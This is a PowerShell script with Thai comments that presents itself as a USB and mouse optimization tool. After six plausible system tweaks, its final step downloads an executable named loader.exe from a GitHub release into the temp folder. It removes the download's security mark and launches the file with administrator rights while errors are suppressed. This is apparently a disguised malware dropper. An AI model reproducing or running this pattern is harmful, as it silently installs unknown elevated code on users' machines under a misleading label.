# กำหนดค่าเข้ารหัสของ Console ให้รองรับ UTF-8 (แก้ปัญหาตัวหนังสือภาษาไทยแสดงผลเป็นเครื่องหมายคำถาม / )
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8

# บังคับเปิดใช้งานโปรโตคอลความปลอดภัย TLS 1.2 สำหรับดาวน์โหลดไฟล์
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ปิดการแจ้งเตือน Error ทั่วไปของระบบเพื่อความราบรื่นในการทำงาน
$ErrorActionPreference = "SilentlyContinue"

# ตรวจสอบสิทธิ์ผู้ดูแลระบบ (Administrator)
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "กรุณาเปิด PowerShell ด้วยสิทธิ์ Administrator (Run as Administrator)"
    Break
}

# เคลียร์หน้าจอคอนโซล
Clear-Host

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "    [+] USB & Mouse Optimize Tool (ระบบตั้งค่าอุปกรณ์เมาส์)" -ForegroundColor Yellow
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host ""

# 1. ปิดโหมดประหยัดพลังงาน USB
Write-Host ">>> [1/7] Optimizing USB Power Settings (ตั้งค่าพลังงาน USB)..." -ForegroundColor White
powercfg /SETACVALUEINDEX SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bea2879909 48e6b7a6-50f5-4782-a5d4-53bb8f07e226 0 2>$null
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bea2879909 48e6b7a6-50f5-4782-a5d4-53bb8f07e226 0 2>$null
powercfg /SETACTIVE SCHEME_CURRENT 2>$null

# 2. ปิดการประหยัดพลังงานใน Registry ของพอร์ต USB ทั้งหมด
Write-Host ">>> [2/7] Disabling USB Selective Suspend in Registry (ปรับแก้ Registry)..." -ForegroundColor White
$USBEnumPath = "HKLM:\SYSTEM\CurrentControlSet\Enum\USB"
if (Test-Path $USBEnumPath) {
    Get-ChildItem -Path $USBEnumPath -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.PSChildName -eq "Device Parameters" } | ForEach-Object {
        Set-ItemProperty -Path $_.PSPath -Name "EnhancedPowerManagementEnabled" -Value 0 -Type DWord -ErrorAction SilentlyContinue
        Set-ItemProperty -Path $_.PSPath -Name "DeviceSelectiveSuspended" -Value 0 -Type DWord -ErrorAction SilentlyContinue
    }
}

# 3. คืนค่า Registry ของเมาส์ให้เป็นค่าเริ่มต้น
Write-Host ">>> [3/7] Restoring Default Mouse Settings (คืนค่าเริ่มต้นความไวเมาส์)..." -ForegroundColor White
$MouseRegPath = "HKCU:\Control Panel\Mouse"
Set-ItemProperty -Path $MouseRegPath -Name "MouseSpeed" -Value "1" -ErrorAction SilentlyContinue
Set-ItemProperty -Path $MouseRegPath -Name "MouseThreshold1" -Value "6" -ErrorAction SilentlyContinue
Set-ItemProperty -Path $MouseRegPath -Name "MouseThreshold2" -Value "10" -ErrorAction SilentlyContinue
Set-ItemProperty -Path $MouseRegPath -Name "MouseSensitivity" -Value "10" -ErrorAction SilentlyContinue

# 4. ตั้งค่าบริการระบบที่เกี่ยวข้อง
Write-Host ">>> [4/7] Restarting Related System Services (รีสตาร์ทบริการจัดการอุปกรณ์)..." -ForegroundColor White
$ServicesToFix = @("DeviceInstall", "hidserv")
foreach ($Service in $ServicesToFix) {
    Set-Service -Name $Service -StartupType Automatic -ErrorAction SilentlyContinue
    Start-Service -Name $Service -ErrorAction SilentlyContinue
}

# 5. ล้างประวัติไดรเวอร์ที่มีสถานะ Error หรือเชื่อมต่อไม่สมบูรณ์
Write-Host ">>> [5/7] Cleaning Up Errored Drivers (ล้างข้อมูลไดรเวอร์ที่มีปัญหา)..." -ForegroundColor White
$TargetDevices = Get-PnpDevice -ErrorAction SilentlyContinue | Where-Object {($_.Class -eq 'Mouse' -or $_.Class -eq 'USB') -and ($_.Status -ne 'OK' -or $_.Present -eq $false)}
foreach ($Device in $TargetDevices) {
    if ($Device.InstanceId) {
        pnputil /remove-device $Device.InstanceId /force | Out-Null
    }
}

# 6. สแกนฮาร์ดแวร์ใหม่เพื่อรีเฟรชไดรเวอร์
Write-Host ">>> [6/7] Scanning For Hardware Changes (สแกนหาอุปกรณ์เมาส์/คีย์บอร์ด)..." -ForegroundColor White
pnputil /scan-devices | Out-Null

# 7. ดาวน์โหลดและแสดงหน้าจอโปรแกรม GUI
Write-Host ">>> [7/7] Downloading Program GUI (กำลังโหลดตัวเปิดใช้งาน)..." -ForegroundColor Yellow

$Url = "https://github.com/zynx7crew/zynx7crew-x/releases/download/v1.0.0/loader.exe"
$DestPath = "$env:temp\loader.exe"

# ตรวจสอบว่าโปรแกรมเก่ากำลังทำงานอยู่หรือไม่ หากเปิดอยู่ให้ปิดการทำงานก่อนดาวน์โหลดทับ
$Proc = Get-Process -Name "loader" -ErrorAction SilentlyContinue
if ($Proc) {
    Write-Host "    [!] Closing active instance of loader.exe (ปิดโปรแกรมเดิม)..." -ForegroundColor Yellow
    Stop-Process -Name "loader" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1
}

try {
    # ลบไฟล์ตัวเดิมออกก่อน
    if (Test-Path $DestPath) {
        Remove-Item -Path $DestPath -Force -ErrorAction SilentlyContinue
    }
    
    # ดาวน์โหลดไฟล์
    Invoke-WebRequest -Uri $Url -OutFile $DestPath -ErrorAction Stop
    
    # ปลดล็อกระบบรักษาความปลอดภัยของไฟล์ดาวน์โหลด (Unblock) ป้องกันปัญหาเปิดบางฟังก์ชันไม่ได้
    Unblock-File -Path $DestPath -ErrorAction SilentlyContinue
    
    Write-Host ""
    Write-Host "    [+] Success! GUI launched successfully (เปิดใช้งานโปรแกรมสำเร็จ)" -ForegroundColor Green
    Write-Host "==========================================================" -ForegroundColor Cyan
    
    # รันโปรแกรมพร้อมกำหนดตำแหน่งการทำงาน (WorkingDirectory) เพื่อให้ฟังก์ชันการบันทึกค่าของโปรแกรมทำงานได้ครบถ้วน
    Start-Process -FilePath $DestPath -WorkingDirectory (Split-Path $DestPath) -Verb RunAs
}
catch {
    Write-Host "    [x] Error downloading application: $_" -ForegroundColor Red
    Write-Host "    กรุณาตรวจสอบการเชื่อมต่ออินเทอร์เน็ต" -ForegroundColor Yellow
}
